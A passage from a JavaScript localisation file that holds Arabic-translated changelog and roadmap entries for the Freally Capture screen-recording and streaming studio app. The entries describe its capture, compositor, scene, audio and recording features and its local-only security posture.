المصادر القادرة على الصوت).","changelog.417eeb2ed567":"الأمان / الخصوصية","changelog.9fd51762b5f0":"الموقف الأمني لم يتغير وأُعيد التحقق منه: يتدفق الصوت المُلتقَط + الإطارات المُركَّبة <strong>فقط</strong> إلى المازج، وجهاز المراقبة الذي يختاره المستخدم، و<strong>ملف التسجيل</strong>، والكاميرا الافتراضية — <strong>لا شيء يغادر الجهاز</strong>، ولا حسابات، ولا قياس عن بُعد (telemetry). يُتحقق من طول وشكل اسم جهاز المراقبة المحفوظ في الإعدادات؛ وتُحلَّل اختصارات المفاتيح ويُتحقق منها قبل دخولها النموذج.","changelog.ce84fae75efe":"<strong>الإجراء الشبكي الوحيد المضاف في هذه الدرجة هو تنزيل ffmpeg الصريح الذي ينقر عليه المستخدم</strong> — عبر TLS من <strong>عنوان URL مثبّت في الشيفرة لكل نظام تشغيل</strong>، و<strong>يُتحقق منه عبر SHA-256 قبل تنفيذ الملف الثنائي على الإطلاق</strong>، ويُشغَّل كعملية منفصلة. ولا يبدأ أبدًا من تلقاء نفسه؛ وعدم تطابق المجموع الاختباري يُلغي التثبيت. ولا يُجري مسار التسجيل المملوك <code>.frec</code> أي اتصالات شبكية على الإطلاق.","changelog.bafa8e1e2feb":"تنتقل مسارات صوت ffmpeg في محرك التسجيل عبر <strong>مقابس محلية فقط (<code>127.0.0.1</code>)</strong> تقبل اتصالًا واحدًا بالضبط ثم تُغلق؛ ويُتحقق من <strong>نطاق وشكل</strong> إعدادات التسجيل (معرّف المُرمِّز، والحاوية، ومعدل البت، والمجلد، واسم الملف) قبل استخدامها، و<strong>تقتصر إجراءات إعادة التغليف/التسجيلات على مجلد التسجيلات</strong> (بفحص المجلد الأصل بعد توحيد المسار) كي لا يصل عرض الويب إلى ملفات عشوائية. وتتعامل محللات <code>.frec</code>/الوسائط مع بايتات الملفات على أنها <strong>غير موثوقة</strong> — مع حد لتخصيص الذاكرة، وإصدار أخطاء بدلًا من الذعر عند المدخلات التالفة.","changelog.ab6195393730":"اعتماديات جديدة من أطراف ثالثة، كلها مسجّلة في <code>THIRD-PARTY-NOTICES.md</code>: <strong><code>tauri-plugin-global-shortcut</code></strong> (اضغط للتحدث/للكتم)، ومجموعة الجلب/التحقق/فك الضغط لجسر ffmpeg (<strong><code>ureq</code></strong> + rustls، و<strong><code>sha2</code></strong>، و<strong><code>zip</code></strong>، و<strong><code>tar</code></strong> + <strong><code>lzma-rs</code></strong>) إضافةً إلى <strong><code>chrono</code></strong> (أسماء ملفات بالتوقيت المحلي). ومعالجة الصوت DSP وترميز <strong><code>freally-video</code></strong> <strong>مملوكان بالكامل</strong>؛ أما ffmpeg فـ<strong>يُشغَّل، ولا يُضمَّن أبدًا</strong>.","changelog.282c879e15bb":"<strong>اختبارات صوت سريعة على عتاد حي</strong> (تبقى <code>--ignored</code> في CI بلا واجهة) إضافةً إلى حاجز حماية لترميز <code>.frec</code> بدقة 1080p60 في وضع الإصدار؛ ومسار ffmpeg الكامل داخل التطبيق: التنزيل ← التحقق ← التسجيل ← إعادة التشغيل هو اختبار الإصدار السريع للمرحلة 4.","changelog.78915e8e8933":"[0.40.0] — 2026-07-02 (المُركِّب + المشاهد/المصادر)","changelog.64aed5d4e90f":"<strong>مُركِّب GPU المملوك المبني على wgpu</strong> (<code>fcap-compositor</code>): يُركَّب كل عنصر مرئي في المشهد من الخلف إلى الأمام في إطار البرنامج مع <strong>نقل/تحجيم/تدوير/اقتصاص</strong> لكل عنصر (تحويل واحد مرجعي ومختبَر باختبارات وحدات)، وأوضاع <strong>المزج</strong> السبعة كلها (عادي/إضافة/طرح/شاشة/ضرب/تفتيح/تعتيم كحالات مزج ذات وظيفة ثابتة)، ورفع بيانات BGRA/RGBA مع مراعاة الخطوة (stride) دون إعادة ترتيب القنوات على CPU، ومسار قراءة بلا واجهة. تتحقق اختبارات الإطار المرجعي من بكسلات GPU حقيقية وتُتخطى مع تنبيه واضح على الأجهزة التي لا محوّل رسوميات فيها؛ وتحافظ بوابة أداء العتاد على <strong>60 fps بدقة 1080p مع 4 مصادر</strong> (5.2 ms/إطار مقيسة على RTX 4070).","changelog.63af29da5231":"<strong>نموذج المشهد/المصدر/الفلتر المملوك</strong> (<code>fcap-scene</code>): تضم المشاهد عناصر مرتبة (الفهرس = ترتيب الطبقات z-order)؛ وتوجد المصادر في مجمّع مشترك ويُشار إليها عبر المشاهد؛ وتحمل العناصر التحويل/المزج/الرؤية/القفل وسلسلة فلاتر مرتبة. مختبَر بالتحويل ذهابًا وإيابًا عبر Serde، ويتحمّل المفاتيح غير المعروفة، ويُصلح نفسه عند التحميل — وهذه هي صيغة مشروع مجموعة المشاهد، تُحفظ تلقائيًا (ذريًا، مع تأخير التكرار debounce) في <code>scene-collection.json</code> داخل مجلد الإعدادات في نظام التشغيل.","changelog.d4fa625cbe70":"<strong>سلسلة فلاتر الفيديو على GPU</strong>، لكل عنصر وبمعاملات قابلة للتعديل مباشرةً: <strong>مفتاح الكروما</strong> (مع كبح التسرّب)، و<strong>تصحيح الألوان</strong> (غاما/سطوع/تباين/تشبّع/تدرّج لوني/عتامة)، و<strong>LUT</strong> (من .cube إلى شبكة ثلاثية الأبعاد)، و<strong>تمويه</strong> (غاوسي قابل للفصل)، و<strong>قناع صورة</strong> (ألفا/إضاءة، عكس)، و<strong>زيادة الحدّة</strong>، و<strong>تمرير</strong> (شريط أخبار ملتف)، و<strong>اقتصاص</strong> — مرتبة، وقابلة للتبديل، وكلٌّ منها مُتحقَّق منه مقابل البكسلات المعروضة. والفلاتر التي لم يُحمَّل ملفها تُتخطى، ولا تُعرض سوداء أبدًا.","changelog.fe58cb003f91":"<strong>مصادر جديدة</strong>: <strong>صورة</strong> (PNG/JPEG/BMP/GIF/WebP…)، و<strong>لون</strong> (كتلة مصمتة)، و<strong>نص</strong> — تشكيل حقيقي للنص عبر rustybuzz (وصل الحروف العربية، والحروف المركّبة، وضبط المسافات بين الحروف)، واتجاه RTL ثنائي الاتجاه وفق UAX #9، والتفاف الكلمات، والمحاذاة، وتباعد الأسطر، وتنقيط مُنعَّم الحواف عبر tiny-skia. <strong>عائلة Noto Sans الكاملة مُضمَّنة</strong> (خطوط متغيرة: كل الأوزان/العروض، قائم + مائل + عربي + عبري؛ بترخيص OFL-1.1 مُضمَّن، مع تثبيت المصدر + قيمة التجزئة) مع <strong>بديل للنص حسب كل مقطع كتابة</strong>، لذا يُعرض النص بشكل متطابق على كل جهاز؛ وتبقى عائلات خطوط النظام قابلة للاختيار، ويمكن لملف خط أن يتجاوزها.","changelog.4a4b0eca4f12":"<strong>بيئة تشغيل الاستوديو</strong>: تتوافق جلسات الالتقاط والمصادر الثابتة مع المشهد النشط في كل نبضة؛ وتتلاءم العناصر المضافة حديثًا تلقائيًا مع أول إطار لها؛ ويغذّي إطار البرنامج المُركَّب قناة <code>preview://</code> نفسها داخل العملية بمعدل ~30 fps بينما يجري التركيب بمعدل ~60؛ وتتدفق حالة كل مصدر (مباشر/انتظار/خطأ) + معدل fps للتركيب عبر الحدث <code>program</code>. ويحصل الجهاز الخالي من GPU على تقرير صادق «لا يوجد GPU» بدلًا من لوحة متجمدة.","changelog.42c0a344221a":"<strong>واجهة الاستوديو</strong>: شريط <strong>المشاهد</strong> يعمل (إضافة/تحديد/إعادة تسمية/إعادة ترتيب/إزالة)، وشريط <strong>المصادر</strong> مع الرؤية/القفل/ترتيب الطبقات/الحالة لكل عنصر وقائمة إضافة تغطي كل نوع مُنفَّذ (إضافةً إلى مشاركة المصادر بين المشاهد)، و<strong>مقابض تحويل على اللوحة دقيقة على مستوى البكسل</strong> (سحب، وتحجيم من الزوايا/الحواف، وتدوير مع التقاط كل 15°، واقتصاص بالسحب مع Alt)، ومربع حوار <strong>الفلاتر</strong> (وضع المزج + السلسلة القابلة للتعديل مباشرةً)، ومربعات حوار <strong>الخصائص</strong> لكل نوع.","changelog.eaef04a3aa25":"ملاحظات صادقة حول النطاق","changelog.52f9e72e5682":"<strong>الوسائط</strong> (ملفات الفيديو) <strong>دُمجت في مرحلة التسجيل</strong> (تقرر ذلك في 2026-07-02): فهي تعتمد على بنية ترميزات النقل القياسية / فك الترميز العتادي (ffmpeg عند الطلب) — إذ لا توجد وحدة فك ترميز فيديو عامة مكتوبة بـ Rust خالصة، والبدائل الشكلية (stubs) مخالفة للميثاق.","changelog.9f015d62a029":"<strong>مصدر المتصفح</strong> ينتقل إلى مرحلة تعمّق البث، بعد <strong>دراسة تصميم استكشافية لعرض الويب خارج الشاشة</strong> (لا يستطيع Tauri v2 عرض عرض ويب في نسيج (texture) عبر المنصات).","changelog.fb9378d724c2":"<strong>نصوص CJK</strong> تستخدم خطوط النظام حاليًا — فخط Noto CJK (~100 MB) غير مُضمَّن؛ والمجموعة المُضمَّنة تغطي اللاتينية/اليونانية/السيريلية + العربية + العبرية.","changelog.30f499446f84":"الموقف الأمني لم يتغير: تبقى إطارات البرنامج المُركَّبة <strong>داخل العملية</strong> خلف المخطط <code>preview://</code> المقيّد بـ CORS؛ والملف الوحيد الذي يكتبه الاستوديو هو مجموعة المشاهد المحلية. الاعتماديات الجديدة من أطراف ثالثة (استخدام <code>wgpu</code> وقت التشغيل، و<code>image</code>، و<code>tiny-skia</code>، و<code>fontdb</code>، و<code>unicode-bidi</code>، و<code>pollster</code>) مرخّصة بتراخيص متساهلة ومسجّلة في <code>THIRD-PARTY-NOTICES.md</code>.","changelog.19084c726e61":"[0.25.0] — 2026-07-01 (نواة الالتقاط)","changelog.a7a34cfb1a75":"<strong>التقاط الشاشة والنافذة لكل نظام تشغيل</strong> خلف الواجهة البرمجية المملوكة <code>fcap-capture</code>، مع إنتاج إطارات مختومة بالوقت وقابلة للرفع إلى GPU عبر قناة يفوز فيها الأحدث، مع عدد صادق للإطارات المُسقَطة:","changelog.871ef2f6ec64":"<strong>Windows</strong> — DXGI Desktop Duplication للشاشات (مع دمج مؤشر الماوس؛ إذ يستبعد النسخ المؤشر) و<strong>Windows.Graphics.Capture</strong> للنوافذ الفردية (Windows 10 1903+)، مع الصمود أمام تبديل أوضاع العرض وتغيير أحجام النوافذ.","changelog.6beba9cca1b5":"<strong>macOS</strong> — <strong>ScreenCaptureKit</strong> (الشاشات + النوافذ، macOS 12.3+)؛ يُطلب إذن تسجيل الشاشة مسبقًا، ويُظهر الرفض رابطًا مباشرًا <strong>فتح إعدادات تسجيل الشاشة</strong> بدلًا من إطار أسود صامت. (رُفع الحد الأدنى للحزمة من 12.0 إلى 12.3 — إذ لا يوجد ScreenCaptureKit قبل 12.3.)","changelog.181ee179e017":"<strong>Linux</strong> — <strong>بوابة ScreenCast</strong> (من <code>ashpd</code> إلى PipeWire) على Wayland، حيث يختار <em>مربع حوار النظام</em> الشاشة أو النافذة (وهو الالتقاط الوحيد الذي يسمح به Wayland — وأداة الاختيار تقول ذلك بوضوح)، إضافةً إلى مسار <strong>X11</strong> مباشر (الشاشات + نوافذ <code>_NET_CLIENT_LIST</code>) في جلسات X.","changelog.2c3347e661da":"مصادر <strong>كاميرا الويب / بطاقة الالتقاط</strong> عبر <code>nokhwa</code> (Media Foundation / AVFoundation / V4L2): إحصاء الأجهزة، وعرض الصيغ لكل جهاز (الدقة / fps / صيغة النقل)، وإطارات RGBA مباشرة، ومسار إذن الكاميرا في macOS (مع تضمين <code>NSCameraUsageDescription</code>).","changelog.eb1065b2fc17":"<strong>معاينة مباشرة للبرنامج</strong>: أصبح «+» في شريط المصادر يعمل — أدوات اختيار التقاط الشاشة، والتقاط نافذة، وجهاز التقاط الفيديو؛ ويُعرض المصدر المحدد مباشرةً في معاينة البرنامج مع طبقة تعرض التسمية / الدقة / fps المقيس / الإطارات المُسقَطة. القناة داخل العملية من طرف إلى طرف (الالتقاط ← JPEG ← المخطط <code>preview://</code> الخاص بالتطبيق ← اللوحة) — فلا تلمس الإطارات أي مقبس أو قرص أبدًا. يُثبت الرسم المباشر صلاحية القناة؛ ويتولى مُركِّب wgpu المهمة اعتبارًا من 0.40.0.","changelog.e3fc6c640b84":"<strong>اختبارات سريعة على عتاد حي</strong> (تبقى <code>--ignored</code> في CI بلا واجهة): جرى التحقق من التقاط الشاشة والنافذة وكاميرا الويب بإطارات حقيقية على عتاد حقيقي.","changelog.c326134a5d1e":"تبقى إطارات المعاينة <strong>داخل العملية</strong> (مخطط URI مخصص — دون مقبس localhost، ودون ملفات مؤقتة)؛ والموقف الأمني لم يتغير: صفر اتصالات شبكية صادرة، ولا حسابات، ولا قياس عن بُعد.","changelog.38a90eaf4fce":"يظهر رفض أذونات نظام التشغيل (تسجيل الشاشة / الكاميرا في macOS) بصدق مع رابط مباشر إلى الإعدادات.","changelog.c6a63e383dbf":"إشعارات جديدة لأطراف ثالثة: <code>pipewire</code> + <code>x11rb</code> (الالتقاط على Linux) و<code>mozjpeg</code> (فك ترميز MJPEG لكاميرا الويب) + <code>jpeg-encoder</code> (ترميز المعاينة) — ويحمل الأخيران ترخيص <strong>IJG</strong>، المذكور الآن في <code>THIRD-PARTY-NOTICES.md</code> والمسموح به في <code>deny.toml</code>.","changelog.2f1e03606026":"[0.10.0] — 2026-07-01 (الأساس والمستودع)","changelog.4648ce7198c9":"واجهة تحكم مبنية على <strong>Tauri v2 + React 19 / TypeScript / Vite 7 / Tailwind 4</strong> (بسمة Havoc الداكنة) فوق مساحة عمل Rust Cargo: حزمة التطبيق <code>freally-capture</code> + حزم المحرك المملوكة <code>fcap-*</code> (<code>capture</code>، و<code>sources</code>، و<code>compositor</code>، و<code>scene</code>، و<code>audio</code>، و<code>encode</code>، و<code>stream</code>)، وكلها <code>#![forbid(unsafe_code)]</code>.","changelog.b146fa224118":"<strong>تخطيط أرصفة الاستوديو</strong> (معاينة برنامج كبيرة، وشريطا المشاهد/المصادر، ومازج الصوت، وعناصر التحكم، والإحصاءات) مع حالات صادقة «لم يُنفَّذ بعد» على كل عنصر تحكم.","changelog.6b08ed4da71e":"<strong>الجسر المُنمَّط بين الواجهة والنواة</strong>: <code>health()</code> (إصدارات التطبيق + حزم النواة المرتبطة)، و<code>settings_get</code>/<code>settings_set</code>، وحدث دفع <code>stats</code> بمعدل ~2 Hz يُعرض مباشرةً في رصيف الإحصاءات (بيانات مؤقتة، موسومة على هذا النحو حتى بدء أخذ العينات الحقيقي في 0.70.0).","changelog.29f30cb39613":"<strong>مخزن الإعدادات</strong>: JSON في مجلد الإعدادات في نظام التشغيل، وكتابات ذرية (ملف مؤقت+إعادة تسمية)، وبدائل احتياطية عند تلف الملف أو فقدانه؛ ويُحفظ مفتاح رصيف الإحصاءات بين مرات التشغيل.","changelog.68352e507bf1":"<strong>مصفوفة CI</strong> (Windows/macOS/Linux): rustfmt، وclippy <code>-D warnings</code>، والاختبارات، وcargo-deny + cargo-audit، وprettier/eslint/tsc/vitest/build للواجهة، وبناءات Tauri للتصحيح لكل نظام تشغيل؛ و<strong>سير عمل للإصدار</strong> يُطلقه الوسم (مُثبِّتات لكل نظام تشغيل ← مسودة GitHub Release).","changelog.77fbaa6cd383":"ملف <code>LICENSE</code> الاحتكاري + وثائق الحوكمة، وموقع <code>docs/</code> الأولي على GitHub Pages مع أيقونة الشارة ذات الشفافية الحقيقية (true-alpha).","changelog.b36a760b89c7":"<strong>جرى التحقق من إصدار Windows</strong>: تطبيق بواجهة رسومية <strong>دون نافذة وحدة تحكم</strong> (تم الفحص على الملف الثنائي المبني)؛ ويُبنى مُثبِّتا MSI + NSIS.","changelog.5da8006aa5c6":"<strong>صفر اتصالات شبكية صادرة</strong> في التطبيق؛ وسياسة CSP صارمة؛ والصلاحية الدنيا <code>core:default</code> فقط؛ ولا تُخزَّن مفاتيح البث/الأسرار (لا يوجد أي منها بعد)؛ و<strong>لا ذكاء اصطناعي/تعلّم آلي في أي مكان</strong> (الميثاق).","changelog.62e65d7911da":"مُخطَّط — 0.25.0 (نواة الالتقاط)","changelog.216d50682cb6":"التقاط الشاشة/النافذة لكل نظام تشغيل (Windows: DXGI + Windows.Graphics.Capture؛ macOS: ScreenCaptureKit؛ Linux: بوابة PipeWire + X11) خلف واجهة <code>Capture</code>.","changelog.22b2b1c3d027":"دخل كاميرا الويب / بطاقة الالتقاط عبر <code>nokhwa</code>؛ ومعاينة مباشرة للبرنامج.","changelog.8716e909baa8":"مُخطَّط — 0.40.0 (المُركِّب + المشاهد/المصادر)","changelog.42125f1329d8":"مُركِّب GPU المملوك المبني على <code>wgpu</code>: التحويل/الاقتصاص/التحجيم/التدوير لكل مصدر، وأوضاع المزج، وسلسلة فلاتر الفيديو (مفتاح الكروما، وتصحيح الألوان، وLUT، والتمويه، والقناع، وزيادة الحدّة، والتمرير).","changelog.5e0cc21c74cc":"نموذج بيانات المشهد/المصدر/الفلتر المملوك؛ والمجموعة الكاملة من المصادر (صورة، ونص، ولون، ووسائط، ومتصفح)؛ وشريطا المشاهد + المصادر مع مقابض التحويل على اللوحة.","changelog.25af1c9ae9bd":"مُخطَّط — 0.55.0 (مازج الصوت + التسجيل)","changelog.c33ce0f2f787":"رسم الصوت البياني عبر <code>cpal</code>: مستوى الصوت/الكتم/المراقبة لكل مصدر، وما يصل إلى 6 مسارات، وإزاحة المزامنة، والخفض التلقائي، واضغط للتحدث، ومقياس LUFS، والفلاتر (إزالة ضوضاء مملوكة بمعالجة DSP كلاسيكية — دون تعلّم آلي — إضافةً إلى البوابة، والضاغط، والمُحدِّد، والمُعادِل، والكسب).","changelog.e1afeb62fe94":"تسجيل متعدد المسارات عبر المُرمِّزات العتادية (NVENC/Quick Sync/AMF/VAAPI/VideoToolbox) + x264 كبديل احتياطي، إضافةً إلى ترميز <code>freally-video</code> المملوك بلا فقدان؛ والحاويات mp4/mkv/mov/webm؛ وتقسيم الملفات؛ ونسخة محلية بمسار منفصل. وترميزات النقل القياسية المقيّدة ببراءات الاختراع عبر جسر ffmpeg عند الطلب والمُتحقَّق من قيمة تجزئته.","changelog.b03b02234da0":"مُخطَّط — 0.70.0 (النسخة الأولية من الاستوديو (MVP) — أول إصدار عام)","changelog.2f588cc01f93":"بث مباشر إلى وجهة واحدة (RTMP/RTMPS) إلى Twitch/YouTube/Kick/Facebook/Trovo/مخصص، مع إعادة اتصال تلقائية وتأخير البث؛ ويستمر التسجيل الرئيسي بغض النظر عن حالة البث.","changelog.8591c913ffa0":"وضع الاستوديو (المعاينة/البرنامج) + الانتقالات (قطع/تلاشٍ/انزلاق/سحب/فاصل انتقالي/مسح بالإضاءة)؛ والكاميرا الافتراضية (لكل نظام تشغيل)؛ والاختصارات العامة؛ وملفات التعريف + مجموعات المشاهد؛ ورصيف الإحصاءات. <strong>أول بناء عام — مجاني بالكامل، مثل كل تطبيقات Freally.</strong>","changelog.ae9d61fc4bdf":"مُخطَّط — 0.85.0 (البث المتعدد / SRT / WHIP + تعمّق المشاهد/المصادر/المُرمِّزات)","changelog.384e7dfb96e1":"بث متعدد متزامن إلى عدة وجهات، مباشرةً إلى كل منصة؛ وبروتوكولا SRT وWHIP؛ ومخرج رأسي/متعدد اللوحات.","changelog.0cb0b6d267f0":"مخزن الإعادة المتجدد مع إعدادات مسبقة؛ والمشاهد المتداخلة، ومجموعات المصادر + الصوت لكل مشهد؛ ومصدر عرض شرائح الصور + إعدادات مسبقة لبطاقات الالتقاط؛ وفلاتر مفتاح اللون/الإضاءة + تأخير العرض؛ ومخرج بمعدلات إطارات عالية/4K، ومعالجة فضاء الألوان + تصغير الخرج؛ وعلامات البث على جانب التسجيل؛ وتعمّق الكاميرا الافتراضية (مصدر واحد + صوت)؛ وحزم فواصل انتقالية ومسح بالإضاءة مميزة؛ وفلاتر متقدمة.","changelog.060db9595543":"مُخطَّط — 1.0.0 (واجهة API البعيدة، والسكربتات، والتقاط الألعاب، والإطلاق)","changelog.26a3256fb4c7":"واجهة API للتحكم عن بُعد عبر WebSocket (على طراز Stream Deck / Companion) + أرصفة المتصفح؛ وسكربتات Lua/JS + حزمة SDK للإضافات.","changelog.bde34ffd89b3":"التقاط الألعاب (ربط خطافات بواجهات GPU من نوع DX/GL/Vulkan، مع تنبيه صادق)؛ وNDI + VST اختياريان.","changelog.fdf05cb85cbf":"مُثبِّتات موقّعة/موثّقة (Win MSI/NSIS، وmacOS .app/.dmg + إضافة الكاميرا الافتراضية، وLinux AppImage/.deb/.rpm/Flatpak) + تحديث تلقائي مستضاف ذاتيًا.","changelog.28cee61c3ca1":"إمكانية الوصول (الأولوية للوحة المفاتيح، وتسميات لقارئات الشاشة، وتباين عالٍ) وتعريب الواجهة إلى 18 لغة (<code>ar de en es fr hi id it ja ko nl pl pt-BR ru tr uk vi zh-CN</code>، الإنجليزية أولًا، والعربية من اليمين إلى اليسار)؛ والإعداد الأولي + القوالب."}; for (var k in add) mine[k] = add[k]; })(window.CAPTURE_I18N = window.CAPTURE_I18N || {});
